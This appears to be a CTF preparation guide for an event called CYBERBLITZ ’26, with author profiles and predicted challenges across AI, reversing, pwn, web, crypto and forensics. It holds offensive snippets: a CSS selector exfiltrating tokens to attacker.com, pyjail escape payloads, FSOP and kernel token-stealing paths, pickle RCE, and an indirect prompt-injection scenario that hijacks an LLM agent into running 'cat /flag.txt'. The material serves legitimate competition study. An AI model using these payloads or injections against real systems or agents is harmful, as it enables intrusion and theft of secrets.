# CYBERBLITZ ’26 Comprehensive CTF Guide & Challenge Predictions

## 1. Overview & Context

- **Event**: CYBERBLITZ ’26 (Qualifiers: 16–17 October 2026; Finals: 5–6 December 2026)
- **Host**: SIT CyberH4ts (Singapore Institute of Technology)
- **Official Sponsors**:
  - Centre for Strategic Infocomm Technologies (CSIT)
  - Cyber Security Agency of Singapore (CSA) / CyberTIG
  - DSO National Laboratories
  - Ministry of Home Affairs (MHA)

---

## 2. Author DNA & Source Analysis

The author notes highlight a curated network of elite CTF researchers, kernel hackers, compiler specialists, and Singapore defense CTF veterans:

| Author / Resource | Known Handles / Teams | Focus Areas | Key Contributions / Noteworthy Research |
| :--- | :--- | :--- | :--- |
| **hxp** | [hxp.io](https://hxp.io/blog/) | All categories, esoteric low-level | Post-quantum Ring-LWE breaks, ePrint cryptanalysis, kernel one-byte writes, KolibriOS browser 0-day, shader pwn. |
| **pepsipu** | [pepsipu.com](https://pepsipu.com/) / DiceGang / US Cyber Team | Pwn, dynamic linkers, low-level OS | DWARF bytecode execution via stack unwinding null-byte writes; `setcontext32` GOT trampoline RCE; `daydream` blind stack OOB write. |
| **hellman** | [affine.group](https://affine.group/) | Cryptography | High-order lattice reduction, discrete log on exotic groups, SAT-based cryptanalysis, bit-sliced Quine-McCluskey. |
| **sasha** | [sashactf.gitbook.io](https://sashactf.gitbook.io/) | Heap exploitation & ROP | Glibc 2.34+ ROP (hookless heap), `setcontext` variants, FSOP, `environ` stack leaks, `fork_gadget`. |
| **washi1337** | [GitHub: Washi1337](https://github.com/Washi1337) | Reverse engineering GOAT | `AsmResolver` (PE/.NET), `OldRod` (KoiVM devirtualizer), `ghidra-nativeaot` (.NET Native AOT analyzer), `AwaitFuscator`. |
| **spl** | [spl.team](https://spl.team/) (Squid Proxy Lovers) | Hardware / Embedded / Bootloaders | BGW210-700 bootloader unlocking, SECCON finalists, router firmware exploitation. |
| **jiaje & shirajuki** | [shirajuki.js.org](https://shirajuki.js.org/blog/pyjail-cheatsheet/) | Pyjail sandboxes | AST bypasses, audit hook tampering, Unicode normalization bypasses, `_frozen_importlib` extraction, generator frames. |
| **amnesia** | [amnesia.sh](https://amnesia.sh/) | Malware & Rev | eBPF debug info analysis, Flare-On 11/12 (10,000 DLLs, .NET AOT, custom ECC), XZ backdoor analysis, VM-based obfuscation (Rhadamanthys). |
| **sylv1e** | [sylvie.fyi](https://sylvie.fyi/) / L3ak / SLICES | Web, Rev, Polyglot | Co-discovered `react2shell` (Next.js/RSC CVE-2025-55182), BMP polyglot RCE (`IMGC0NV`), MBA deobfuscation with Z3, Scratch game reversing. |
| **jro** | [jro.sg](https://jro.sg/) / CSIT / Greyhats | Pwn, Rev, Cloud/AI | Author of `AGAR` (IDA Go analysis), CVE-2025-52692 (Linksys router auth bypass on CSIT tech blog), IDA MCP server prompt injection RCE, CDDC / TISC challenges. |
| **elma** | [blog.elmo.sg](https://blog.elmo.sg/) | Pwn, Rev, Network Forensics | DEFCON Black Badge, callee-saved register control-flow obfuscation, ELF dynamic symbol resolution abuse, HTTP/3 QUIC decryption in Wireshark. |
| **samuzora & june** | Singapore local CTF scene | Pwn & Rev | Veteran CDDC, TISC, and GreyCTF challenge authors and players. |
| **neobeo & sceleri** | [adib.au](https://adib.au/) & [blog.sceleri.cc](https://blog.sceleri.cc/) | Cryptography (Project SEKAI) | Authors of `apbq-rsa-iv`, `zerodaycrypto`, `mathjail2`. GPU-accelerated 64-bit ECDLP, LLL/Coppersmith, UOV multivariate signatures, complex elliptic curves. |
| **unvariant** | [unvariant.pages.dev](https://unvariant.pages.dev/) / idek / les amateurs | Kernel pwn, OS internals | Windows kernel driver exploitation (`FileUtility`), physical memory primitives, bootkit UEFI exploitation, RISC-V pwn. |
| **jorian** | [jorianwoltjer.com](https://jorianwoltjer.com/) | Web security | Practical CTF notes, nonce CSP bypass via disk cache, prototype pollution, cache deception, request smuggling. |
| **rebane** | [lyra.horse/blog/](https://lyra.horse/blog/) | Esoteric Web & Client-Side | `x86CSS` (CSS-only x86 CPU emulator), SVG clickjacking, CSS-only exfiltration, V8 browser pwn at openECSC. |

---

## 3. Predicted Challenges by Category

### A. Artificial Intelligence (AI / LLM)

Given `jro.sg`'s research into IDA MCP prompt injection and `sylv1e`'s critique of automated LLM solvers, expect AI challenges focused on adversarial mechanics and agent tool exploitation rather than basic chat interfaces.

1. **Indirect Prompt Injection via Analysis Pipelines**
   - **Scenario**: A service takes an uploaded artifact (ELF binary, git repository, or network log) and invokes an autonomous LLM agent with inspection tools (MCP server, shell executor, file reader).
   - **Vector**: Embedding instructions inside ELF section headers (`.comment`), symbol tables, metadata strings, or commit messages that hijack the model's context and trick it into running arbitrary tools (`run_cmd("cat /flag.txt")`).
2. **PyTorch / Safetensors Deserialization RCE**
   - **Scenario**: An ML inference service loads a supplied model weights file (`.pt`, `.bin`).
   - **Vector**: Standard `torch.load()` relies on Python's `pickle`. Attackers construct weaponized opcodes via `fickling` to execute shell commands during deserialization.
3. **Classifier / Vision Adversarial Perturbations**
   - **Scenario**: A neural network gating access to the flag requires an image classified as a specific class with >99% confidence.
   - **Vector**: FGSM (Fast Gradient Sign Method) or PGD (Projected Gradient Descent) to craft minimal pixel noise that forces misclassification.

---

### B. Reverse Engineering (Rev Eng)

Heavily informed by `washi1337`, `jro` (AGAR), `elma`, and `amnesia`. Expect anti-decompilation tricks that render raw IDA/Ghidra output misleading.

1. **Stripped Go Binaries with Corrupted / Obfuscated Pclntab**
   - **Scenario**: A Linux x86_64 or ARM64 Go binary with stripped symbol tables and heavy goroutine/channel communication.
   - **Technique**: Recovery of runtime types using `AGAR` (IDA plugin by jro) or `GoReSym`. Trace channel sends/receives to map the state machine.
2. **.NET Native AOT & Async/Await Obfuscation**
   - **Scenario**: A Windows PE compiled via .NET 8/9 Native AOT, stripping traditional MSIL metadata and leaving optimized native x64 assembly.
   - **Technique**: Use `ghidra-nativeaot` or `AsmResolver` to reconstruct method pointers and identify runtime types. If obfuscated with state machines (e.g. `AwaitFuscator`), analyze the `MoveNext` dispatcher loop.
3. **Symbol Resolution & Dynamic Linker Abuse (`elma` style)**
   - **Scenario**: A binary abusing Linux dynamic linker features (`DT_HASH`, `DT_GNU_HASH`, or custom PLT trampolines) where standard disassemblers resolve function calls to the wrong external libraries.
   - **Technique**: Manually inspect the relocation entries (`readelf -r`, `objdump -d`) and step through the linker resolver in GDB.
4. **Mixed Boolean Arithmetic (MBA) & Custom VM Devirtualization**
   - **Scenario**: Complex flag validation using convoluted expressions like `(x & ~y) + (y & ~x)`.
   - **Technique**: Feed expressions into Z3 Python AST simplifiers or run symbolic execution via Triton/angr. If a custom bytecode VM is present, dump the bytecode stream and write a custom disassembler.

---

### C. Binary Exploitation (Pwn)

Informed by `sasha` (glibc 2.34+), `pepsipu` (dynamic linker tricks), and `unvariant` (Windows kernel).

1. **Modern Glibc (>= 2.34) Heap & File Stream Oriented Programming (FSOP)**
   - **Environment**: Ubuntu 22.04 or 24.04 (no `__free_hook`, no `__malloc_hook`).
   - **Primitive**: UAF or off-by-one heap overflow.
   - **Exploitation Path**:
     - Leak libc base via unsorted bin or large bin chunks.
     - **House of Apple 2**: Corrupt `_IO_list_all` to forge an `_IO_FILE` structure using `_IO_wfile_jumps` (`_IO_wfile_overflow` / `_IO_wfile_underflow`) to hijack execution flow and invoke `system("/bin/sh")` or a stack pivot gadget.
     - Leaking `environ` pointer to compute the saved `main()` return address on the stack, followed by writing a direct ROP chain.
2. **Blind Stack Exploitation / Leakless Code Execution (`pepsipu` style)**
   - **Primitive**: Stack out-of-bounds write without an address leak or output channel.
   - **Technique**: Partial return address overwrites (e.g., swapping the low 2 bytes to jump to an existing syscall or internal dispatcher), or triggering glibc stack unwinding mechanisms via DWARF bytecode execution.
3. **Windows Kernel / Driver Exploitation (`unvariant` style)**
   - **Environment**: Windows Server / Windows 11 VM with an attached custom driver (`.sys`).
   - **Primitive**: Vulnerable IOCTL handling resulting in arbitrary decrement or non-paged pool overflow.
   - **Exploitation Path**: Manipulate page table entries (`PTE`) to map kernel memory into user space, or traverse the `EPROCESS` list to overwrite the token of the current process with the `SYSTEM` token.

---

### D. Web Exploitation & Pyjails

Informed by `shirajuki` (pyjails), `sylv1e` (RSC CVE-2025-55182), `jorian`, and `rebane`.

1. **Restricted Pyjail Sandboxes**
   - **Constraints**: Filtered builtins (`__builtins__ = {}`), blocked characters (e.g., no quotes, no letters `a-z`, or length limits < 80 chars).
   - **Bypasses**:
     - Unicode normalization: `_＿𝘪𝘮𝘱𝘰𝘳𝘵＿_` or equivalent fullwidth/italic forms.
     - Generator frame inspection: `(_ for _ in ()).gi_frame.f_builtins`.
     - Subclass traversal: `().__class__.__base__.__subclasses__()` targeting `_frozen_importlib_external.FileLoader` or `os._wrap_close`.
     - Decorator syntax execution: `@exec\n@input\nclass a:...`.
2. **Modern Full-Stack Framework Flaws (Next.js / SSR / RSC)**
   - **Scenario**: Next.js App Router or React Server Components application.
   - **Vector**: Flight protocol deserialization errors, prototype pollution in nested JSON parameter parsers, or server-side prototype pollution cascading into RCE.
3. **CSS-Only Exfiltration & XS-Leaks (`rebane` style)**
   - **Scenario**: High-security web application with strict script-src CSP (`nonce`-based) and a headless Chrome admin bot.
   - **Vector**: Injecting CSS attribute selectors (`input[name="csrf"][value^="a"] { background: url('//attacker.com/leak?a'); }`) or scroll-to-text-fragment XS-Leaks to extract tokens character-by-character without running JavaScript.

---

### E. Cryptography

Informed by `neobeo`, `sceleri` (SekaiCTF), and `hellman`.

1. **Lattice Reduction (LLL / BKZ / Coppersmith)**
   - **Target**: RSA with low private exponent, high partial key leakage, or linear multivariate equations modulo $N$ (`apbq-rsa`).
   - **Technique**: Formulate the algebraic relationship into a matrix polynomial and apply SageMath's `.LLL()` or `small_roots()` to recover unknown variables in polynomial time.
2. **Elliptic Curve Parameter Anomalies**
   - **Target**: Custom curves with smooth order $E(\mathbb{F}_p)$ allowing Pohlig-Hellman attacks, or anomalous curves ($#E(\mathbb{F}_p) = p$) allowing Smart’s attack.
   - **Technique**: Incomplete point addition formulae that fail when inputs have order 2, or missing validation on curve parameter $b$ allowing small invalid curve subgroups.
3. **Post-Quantum Multivariate Cryptography (UOV)**
   - **Target**: Unbalanced Oil and Vinegar signature schemes with sub-optimal parameters.
   - **Technique**: Kipnis-Shamir attack or differential attacks to distinguish the oil subspace from the vinegar subspace.

---

### F. DFIR, Network & Malware Analysis

Informed by `elma` (HTTP/3 Wireshark decryption), `amnesia` (eBPF analysis), and `jro` (NTFS alternate data streams).

1. **HTTP/3 & Encrypted Traffic PCAP**
   - **Scenario**: Network capture full of UDP QUIC packets on port 443.
   - **Analysis**: Locate key secrets (pre-master secret log / `SSLKEYLOGFILE`) in associated memory dumps, client environment files, or decrypted browser caches to dissect the HTTP/3 stream in Wireshark.
2. **NTFS Deep Forensics & Disk Images**
   - **Scenario**: Raw disk dump (`.dd`, `.raw`) of a compromised Windows workstation.
   - **Analysis**: Inspect Alternate Data Streams (`ADS`), analyze `$MFT` records with `MFTECmd`, parse Volume Shadow Copies (VSS), and reconstruct scheduled tasks / WMI event subscriptions used for persistence.
3. **eBPF Malicious Hooks Analysis**
   - **Scenario**: A Linux server memory dump or live triage archive where processes are hidden from `ps` and open ports are missing from `netstat`.
   - **Analysis**: Inspect `/sys/fs/bpf`, extract eBPF bytecode programs with `bpftool`, and decompile eBPF instructions to discover hidden command-and-control IP addresses or hooking logic.

---

## 4. Pre-Competition Toolkit & Cheatsheet

### Key Python & Terminal Tools
```bash
# Cryptography
sage -v                        # SageMath is mandatory for LLL/Coppersmith

# Reverse Engineering
gore_sym -h                    # Go symbol recovery
python3 -m pip install z3-solver angr capstone ropper

# Binary Exploitation
python3 -m pip install pwntools
gdb -q -ex "version"           # Ensure pwndbg or GEF is configured

# Forensic & Network
tshark -v                      # Ensure QUIC/HTTP3 support is enabled
volatility3 -h
```

### Essential References
- **Pyjail Cheatsheet**: [shirajuki.js.org/blog/pyjail-cheatsheet](https://shirajuki.js.org/blog/pyjail-cheatsheet/)
- **Pwn 2.34+ Notes**: [sashactf.gitbook.io/pwn-notes](https://sashactf.gitbook.io/pwn-notes/)
- **Practical CTF Guide**: [book.jorianwoltjer.com](https://book.jorianwoltjer.com/)
- **Jro's Blog & Tools**: [jro.sg](https://jro.sg/)
- **Elma's Blog**: [blog.elmo.sg](https://blog.elmo.sg/)
